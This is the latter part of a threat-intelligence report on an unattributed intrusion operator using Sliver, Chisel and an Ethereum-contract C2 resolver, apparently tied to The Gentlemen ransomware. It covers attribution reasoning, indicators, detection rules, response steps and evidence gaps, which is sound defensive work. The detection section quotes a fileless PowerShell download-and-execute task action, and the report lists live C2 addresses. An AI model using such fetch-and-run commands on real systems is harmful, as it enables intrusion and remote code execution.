> **Note on UTA identifiers:** "UTA" stands for Unattributed Threat Actor. UTA-2026-024 is an internal tracking designation assigned by The Hunters Ledger to actors observed across analysis who cannot yet be linked to a publicly named threat group. This label will not appear in external threat intelligence feeds or vendor reports, it is specific to this publication. If future evidence links this activity to a known named actor, the designation will be retired and updated accordingly.

I cannot attribute this to a named threat actor. The infrastructure served a confirmed ransomware deployment by a criminal group known as The Gentlemen, but whether the operator I tracked pulled that trigger themselves or handed access to someone who did is something the evidence cannot settle.

That single paragraph is the answer most readers need, and everything below is why it stops there. The important thing about attribution in this case is that it is not one question. It is four, they have four different answers, and collapsing them into a single label would misrepresent every one of them.

### The four questions, separately

Who ran this intrusion is INSUFFICIENT, and I cannot attribute it. No named actor fits the evidence well enough to survive the alternatives.

That `193.233.202.17` served as command and control in a confirmed The Gentlemen ransomware deployment during this operator's tenancy is HIGH, at approximately 88 percent, and strong indicators support it. Two things carry that. Huntress observed this address as scheduled-task C2 in a confirmed Gentlemen incident, complete with a signatured encryptor and the group's own ransom note, and that is their own first-party incident telemetry rather than an inference drawn from someone else's write-up. Separately, the Chisel reverse-SOCKS invocation, the service-binary masquerade and the scheduled-task naming family in their incident all match the equivalents in the kit captured here.

That the operator captured here is themselves a The Gentlemen affiliate who deployed the encryptor is LOW, at approximately 60 percent, and only weak indicators suggest it. Everything recovered stops short of Impact. There is no encryptor in this corpus, and a kit that establishes access, credentials, tunnels and persistence is exactly as consistent with selling that access as with using it.

That this operator shares a builder with the DPRK-suspected cluster reported against the same technique is ruled out at HIGH, approximately 90 percent. This is a negative finding and it rests on measurement rather than absence. The resolver contract's bytecode differs from all three sibling contracts in length, in embedded source hash, and in carrying four unreferenced constant-returning functions present in one sibling and absent from the others at any offset. Four of the four publicly known contracts in that family were compared, so the denominator is stated and complete for the known set rather than assumed chain-wide.

### How the competing explanations were tested

The hypothesis that survives with zero inconsistencies across ten graded evidence rows is that an unknown intrusion set ran the access and the tunnelling, and a Gentlemen affiliate deployed the encryptor, whether by handoff, brokerage or partnership. It also survives a sensitivity check that removes the single most diagnostic piece of evidence, the Huntress telemetry, and still eliminates both the DPRK hypothesis and the coincidence hypothesis.

The runner-up is that the operator captured here is a Gentlemen affiliate running both halves themselves. It carries two inconsistencies, both weak on inspection, and if those are discounted it ties with the leading reading rather than losing to it. That tie is the actual reason the identity question sits at INSUFFICIENT rather than at LOW. It is not that the evidence is thin, it is that two coherent explanations fit it equally well and nothing available discriminates between them.

One vendor hedge shaped that analysis and it is worth stating accurately, because a narrower reading of it circulated in this case's own notes before someone went back to the source. Sysdig's report on the technique family hedges on two separate questions rather than one. It is uncertain which DPRK cluster is responsible, and it separately allows that another sophisticated actor may be combining techniques from several documented campaigns specifically to complicate attribution. The comparison population for any DPRK reading is therefore shakier than a single-sentence quote conveys, not less shaky.

### What the tenancy evidence does and does not show

The claim that one operator occupied this address across the relevant window rests on a measured series of fourteen certificate identities and nine JARM groups running from 2022 to 2026, showing no reversion to any pre-2025 tenant identity after November 2024.

That is an upgrade from inference to measurement and I want to be honest that it does not close the question. The record carries a genuine six-month certificate silence between 2026-01-06 and 2026-07-10, with only a JARM observation and no certificate corroboration inside it. Continuous single-tenant occupancy is consistent with that record rather than proven by it. The 88 percent figure does not rest here in any case, which is why the gap does not move it. The tenancy series was always corroboration, and the two load-bearing items are the first-party telemetry and the tooling convergence.

### The designation

I am tracking this as **UTA-2026-024**, working name "the EtherHiding resolver operator at AS203273", status ACTIVE.

The designation covers the intrusion set, meaning the operator who ran the Sliver, Chisel and blockchain-resolved toolkit captured here. It does not cover The Gentlemen ransomware program, and the relationship to that program is an attribute of the designation carrying its own confidence rather than part of its identity. My confidence that this is a distinct actor at all is **MODERATE**, around 75 percent, because it separates cleanly from the three sibling contracts on build fingerprint while it remains unresolved whether it is distinct from the operator behind a separate June intrusion that used the same resolver entry.

The designation retires when a curated group designation can be attached at HIGH confidence or better. Nothing currently supports that.

### Where this sits against Hunt.io's reading

Nothing in this designation disputes Hunt.io's finding. They describe this operator as an affiliate of the ransomware program, and I am working from the same underlying evidence they cite, which in both cases traces back to the Huntress incident report. What I am adding is narrower than a disagreement. Their reporting does not address whether the access-phase operator and whoever deployed the encryptor are the same hands, so rather than assert an answer to a question nobody has yet examined, I track the intrusion set on its own.

The two positions are compatible rather than competing. An affiliate is a relationship to a program rather than an actor identity, and the affiliate goes unnamed on either reading. Unit 42's profile of this program documents that it works with both recruited affiliates and initial-access brokers, naming both in a single recruitment post, so an access operator handing off to a separate encryptor operator is the program's ordinary shape rather than an alternative I reached for to avoid committing.

Two things would close the gap and let this designation retire into their framing. The first is asking Huntress directly whether their post-incident telemetry can separate the two roles at all, and I expect it likely cannot, since that environment carried no attack-time endpoint or log telemetry. The second is a build-level hash match between the binary Huntress observed and the Chisel builds recovered here, which would establish that the same hands touched both incidents, though even that would not prove encryptor deployment on its own.

### The shared resolver entry, and what it might mean

One contract entry, written by one wallet, resolved C2 for two materially different toolsets. Ours is the Sliver, Chisel and Ligolo chain described in this report. The other is a loader and remote-management chain published in June by Huntress, naming this exact contract and storage key.

Three readings fit. One operator running two toolsets, a resolution surface shared between operators, or a handoff from one to the other. My lean is toward a shared resolution surface, mostly on duration. This runs across five months on abuse-tolerant hosting, and a two-week campaign would make the shared-surface reading much less likely than a long one does. A single operator or, more likely, a team running two toolsets is a close second and I would not argue hard against it.

What keeps all three alive is that the setter is permissionless, so the contract's design cannot rule out a second party writing to a different key, and nothing observed discriminates between the three. That stays **NOT CHECKED** rather than being resolved by preference.

---

## 12. Indicators of Compromise
{: .hl-tier-2}

The full machine-readable feed is published separately at [`sliver-c2-windows-postex-staging-193-233-202-17-iocs.json`](/ioc-feeds/sliver-c2-windows-postex-staging-193-233-202-17-iocs.json), carrying 321 indicators. That includes 234 file hashes across 80 unique samples, three IP addresses, six domains, nine URLs, seven registry keys, 22 file paths, five scheduled-task names and the blockchain constants.

Three things about that feed are worth reading before you ingest it.

The contract address is the durable indicator and the hashes mostly are not. Domains rotated five times in five months and the contract address has never changed, because it cannot change without redeploying to every victim. For the Node.js strand specifically, hashes are close to worthless across victims by design, since the C2 re-obfuscates the bot server-side per victim on first run. Hunt the operational constants that re-obfuscation cannot touch, which are the contract address, the storage key, the ABI selector, the build identifier and the custom polling header.

Two addresses carry handling constraints that a bare blocklist would destroy. `77.110.126.46` is marked hunt only and must never be blocked, because operator use is certain while ownership of the box is not established. `146.103.127.44` is historical, April 2026 only, and has since been reassigned to an unrelated occupant, so it is monitor rather than block. A feed consumer that flattens these into one blocklist will harm a third party and gain nothing, since the operator has already moved.

The feed carries an explicit exclusions list and it is not padding. Twelve values were considered as indicators and rejected on a stated test, each with the test recorded. The JA3 fingerprint is there at its measured 3,645 hosts, the shared JARM at its measured 1,307,847 address and port pairs, the same-autonomous-system address that a vendor grouped with ours, and a set of Go string-pool artifacts that look like indicators but are compiler and runtime residue. Publishing what was rejected and why is the part that lets somebody else check the work rather than take it on faith.

---

## 13. Detection and Response Guidance
{: .hl-tier-2}

The complete rule set is published separately at [`sliver-c2-windows-postex-staging-193-233-202-17-detections.md`](/hunting-detections/sliver-c2-windows-postex-staging-193-233-202-17-detections/), and it carries 18 rules: 4 YARA, 12 Sigma and 2 Suricata. Thirteen are alerting-grade Detection rules and five are broader Hunting rules for scoping. Every one of them keys on a behaviour or a build artifact rather than an address, because this operator has already demonstrated five domain rotations, three addresses and twenty per-build ports.

### The three anchors that survive rotation

Ranked by how well each holds up when the operator changes infrastructure, which they demonstrably do.

The strongest is a fixed sixty-second beacon interval with no measured jitter. It is purely behavioural and tied to no indicator at all, so no address, domain or port change touches it. It is also, awkwardly, the one no signature can express, which I come back to below.

Second is an HTTP POST to freshly generated paths shaped like minified static assets, carrying a single-letter query parameter. The method is the anomaly rather than the path, because a real minified asset is fetched with GET and never posted to. This is a build-profile invariant, so it survives address and domain rotation, and it is covered by a Suricata signature.

Third is a hardcoded User-Agent claiming `Chrome/108.0.6602.492`. No genuine Chrome installation of any version ever sent that string, because Chrome 108 stable builds are versioned `108.0.5359.x`. It is compiled into the build profile and survives infrastructure rotation, though a rebuild that changes the string defeats it, which is what holds it below the other two.

For the intrusion rather than the tooling, the two highest-value host signals remain a service account created outside normal provisioning and added straight to Domain Admins, and a scheduled task whose action is a fileless `iex((New-Object Net.WebClient).DownloadString(...))` running as SYSTEM under a forged author.

### What is not covered, and why

The gaps here are real ones rather than a formality, and the largest is the top-ranked anchor.

The sixty-second zero-jitter interval has no rule. Suricata and Sigma are both per-event matchers, and neither has any way to measure the variance of inter-connection timing across a sequence of past flows. Expressing this honestly needs flow-timing analytics, a beacon-scoring capability of the kind Zeek with RITA provides, or equivalent network-detection tooling that windows and scores connection cadence. Writing it as a signature would mean either inventing syntax that does not exist or silently degrading it into a much weaker proxy. The same limitation covers the paired connections to ports 80 and 443 within one second, and the fallback-ladder behaviour across three tiers of hardcoded C2. If you run beacon analytics against egress traffic, that is the correct tool for all three, and it will outperform every signature in the file.

TLS fingerprinting gives you nothing here. The JA3 is measured commodity Go TLS and is excluded on that measurement. JA4 and the no-SNI-to-bare-IP combination are genuinely unmeasured rather than merely unexamined, and neither is offered as a substitute.

The five-domain naming convention is real hunting signal that no selector can express. Recognising "two concatenated English words, no hyphen, `.com`" needs a dictionary-backed check that no content match or field selector performs. A wordlist-driven query against newly observed domains is the right tool.

**Planting a DNS record into an AD-integrated zone** has no rule here, because catching it needs DNS Server audit logging that very few environments enable. Shipping a rule against telemetry that almost certainly does not exist would carry more false confidence than value, so it is named here instead.

Chisel and Ligolo-ng are deliberately not ruled on at all. A command-line pattern for Chisel's reverse-SOCKS invocation was considered and rejected, because it identifies use of the stock public tool rather than this operator, and it would fire on every unrelated intrusion that reaches for the same tool.

One point of precision on the ATT&CK coverage. The rule set covers T1685 for the endpoint-protection services disabled in one burst. It carries nothing for T1686, the firewall row in Section 10, because no firewall-modification behaviour in this campaign was rule-worthy on its own. The mapping in Section 10 describes what the operator did; the rule set describes what is caught, and those are not the same set.

### Response orientation

Targets only. Procedure belongs to the affected organisation rather than to a third-party intelligence provider.

Reset credentials across the affected domain rather than only the accounts known to have been touched, because three independent credential-collection routes ran here and one of them produces offline-crackable material whose use leaves no trace at collection time.

Audit privileged group membership against change control, then audit scheduled tasks for forged authors and backdated registration timestamps. Removing a payload while leaving the weekly re-pull task in place removes nothing.

Restore the DNS filter's whitelist to its intended state and rotate that appliance's administrative credential, then remove any operator-planted records from internal DNS zones. Both halves are needed, since the whitelist entry and the DNS record are one mechanism.

Check for RDP enabled with Network Level Authentication disabled across the estate, since that change widens exposure to everyone rather than only to this operator.

For ongoing tracking, monitor the resolver contract rather than chasing domains. It returns the operator's next C2 the moment they set it, it costs nothing, and they cannot tell anyone is watching.

---

## 14. Confidence Summary and Evidence Gaps
{: .hl-tier-2}

What follows separates what this investigation settled from what it deliberately left open, and says what would close each remaining gap rather than leaving it as an unexplained absence.

### What is settled

The Sliver identification is **DEFINITE**, on the implant naming its own framework in memory and on surviving protobuf getters in the binary. The Node.js bot's construction is **DEFINITE** on the decrypted code, which was read rather than inferred.

The rotation history is **DEFINITE and complete**, which is a stronger claim than a sampled record. The contract emits an event on every write, so enumerating those events over its full range returns the whole history rather than a lower bound. Five writes, one signing address, six transactions that are the contract's entire lifetime.

The link between the two C2 strands is **DEFINITE**, resting on the first contract value being the same domain the operator whitelisted through the victim's DNS filter and planted in its internal DNS.

### Two explanations I could not eliminate

These are the reason two readings in this report are not rated higher, and both survived an adversarial pass rather than being overlooked.

Whether the repeated `Avenel, CA, US` registrant string is this operator's fingerprint or a commodity tool's hardcoded default is NOT ESTABLISHED. As evidence that three domains came from one registration process it is STRONG. As a pivot to find infrastructure outside this set it is NOT CHECKED, and the thing that would settle it is a reverse search on that registrant string, which is blocked for want of a credential. If the tool turns out to be commodity, the string identifies its users rather than these operators, and anyone hunting on it would be pulling in strangers. That is precisely the failure mode this publication has already had to retract an indicator for, so the claim is split by scope rather than reworded to sound safer.

Whether the resolver contract is still actively maintained is undecided by design. No public reporting has re-examined it since 2026-08-04. That is an absence of reporting rather than evidence of dormancy, and it cuts both ways equally, which is why I describe the contract's history in the past tense and make no claim about its present status. The last observed write is the one dated 2026-07-01.

### What I could not establish

The Sliver version is unrecovered, stripped by symbol obfuscation and absent from memory. The numeric beacon interval and jitter values live in serialised protobuf rather than as text, so the sixty-second figure comes from observed network behaviour rather than from parsing the configuration.

The beacon shellcode blob yields nothing to static string analysis, and that is a genuine negative rather than an unchecked one, so unpacking is the only route to it. The Go stub code past the point where it hands `cmd.exe` to the socket has not been decompiled, though what it does before that point is fully established.

Three related samples were never obtainable, and the remaining acquisition route is quota-blocked. Four file hashes shared between `77.110.126.46` and a seized domain remain unidentified, which is a named gap and not a checked negative.

Several prevalence questions stay unmeasured and are recorded as NOT CHECKED rather than as weak positives. The MSI UpgradeCode's prevalence across unrelated samples is one. Whether the four-constant contract fingerprint is unique beyond the four publicly known contracts in that family is another, since the comparison covers the known set rather than the whole chain. And the combination of reverse-SOCKS invocation, service masquerade and task-naming family that ties this kit to the published ransomware incident has no measured denominator, so it corroborates rather than proves.

One question about scope stays open. Whether the victim in a second published incident is the same organisation as the one here is unresolved, because the sector descriptors in the two accounts are adjacent without being identical.

### One thing worth saying about how this case was corrected

Almost everything the first pass concluded about these binaries was measured through a window too small to see through, and several confident negatives turned out to be broken checks rather than real absences. The two dozen numbered binaries were called probable Sliver implants and are plain reverse shells. They were said to contain no C2 addresses, and every one of them contains its own in the clear, invisible only to an extraction method that tokenises strings and so cannot see a substring inside Go's pooled string blob. A domain was read as a likely victim's server and turned out to be seized malicious infrastructure.

Each of those was one cheap check away, and each is recorded here rather than quietly fixed, because a reader deciding how much weight to put on the rest of this report is entitled to know which parts were hard-won. An empty result is not an absence unless the check reports what it actually covered.

---

## 15. References
{: .hl-tier-2}

Prior publication on this infrastructure, in date order:

- **Huntress** (2026-05-21): "The Gentlemen Ransomware Defense Evasion TTPs". First-party incident telemetry naming `193.233.202.17` as scheduled-task command and control in a confirmed ransomware deployment. [huntress.com](https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps)
- **Huntress** (2026-06-16): "Potemkin Loader, RMMProject and ClickFix". Names the same Ethereum contract entry resolving C2 for a different toolset, and attaches no actor attribution of its own. [huntress.com](https://www.huntress.com/blog/potemkin-loader-rmmproject-clickfix-attack)
- **Hunt.io** (2026-08-04): "The Gentlemen Affiliate Deploys EtherRAT". Same address, same contract, same five historical C2 domains, with eleven published file hashes matching this corpus byte for byte. [hunt.io](https://hunt.io/blog/the-gentlemen-etherrat-ethereum-smart-contract-c2)

On the technique family:

- **Sysdig** (2025-12-08): first public documentation of the EtherRAT on-chain resolver technique, against Linux targets. Cites ReversingLabs documenting the same blockchain-resolution idea in NPM supply-chain packages in July 2025, using a simpler single-endpoint version.
- **ASEC / AhnLab** (2025-12-12): independent write-up of the same contract Sysdig documented.
- **eSentire** (2026-03-25): "EtherRAT and the SYS_INFO Module", documenting a third contract in the family.
- **Atos**, via **The Hacker News** (2026-04-30): a fourth contract, reported as EtherRAT distribution spoofing. The original vendor publication was not locatable at a stable URL, so the retained source is the secondary coverage.

On the ransomware program:

- **Unit 42** (2026-07-10): technical profile of The Gentlemen ransomware.
- **The DFIR Report** (2026-05-11): "EtherRAT and TukTuk C2 End in The Gentlemen Ransomware".

Framework reference:

- **MITRE ATT&CK**, Software S0633 (Sliver), and the v19.2 technique set used for the mapping in Section 10.

---

© 2026 Joseph, The Hunters Ledger. Licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/), free to republish and adapt, including commercially, with attribution to The Hunters Ledger and a link to the original.
